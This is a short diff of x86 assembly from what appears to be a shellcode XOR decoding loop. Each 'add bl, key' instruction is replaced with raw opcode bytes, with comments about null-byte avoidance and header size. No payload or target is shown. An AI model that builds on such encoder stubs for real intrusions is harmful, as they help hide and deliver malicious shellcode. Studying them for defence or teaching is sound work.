@@ -42,7 +42,7 @@ start_encoding:
 start_encoding_loop:
 	mov edx, [esi]
 	mov ebx, eax
-	add bl, key1 ;have to use 8-bit register to remove null bytes
+	db 0x83, 0xc3, 0x73 ;add ebx, key1 -- this value will need to be changed if the header changes size
 	xor edx, [ebx]
 	mov [esi], edx
 	inc esi
@@ -51,7 +51,7 @@ start_encoding_loop:
 	je actual_start_shellcode
 	mov edx, [esi]
 	mov ebx, eax
-	add bl, key2 ;have to use 8-bit register to remove null bytes
+	db 0x83, 0xc3, 0x77 ;add ebx, key2 -- this value will need to be changed if the header changes size
 	xor edx, [ebx]
 	mov [esi], edx
 	inc esi
@@ -60,7 +60,7 @@ start_encoding_loop:
 	je actual_start_shellcode
 	mov edx, [esi]
 	mov ebx, eax
-	add bl, key3 ;have to use 8-bit register to remove null bytes
+	db 0x83, 0xc3, 0x7b ;add ebx, key3 -- this value will need to be changed if the header changes size
 	xor edx, [ebx]
 	mov [esi], edx
 	inc esi
@@ -69,7 +69,7 @@ start_encoding_loop:
 	je actual_start_shellcode
 	mov edx, [esi]
 	mov ebx, eax
-	add bl, key4 ;have to use 8-bit register to remove null bytes
+	db 0x83, 0xc3, 0x7f ;add ebx, key4 -- this value will need to be changed if the header changes size
 	xor edx, [ebx]
 	mov [esi], edx
 	inc esi
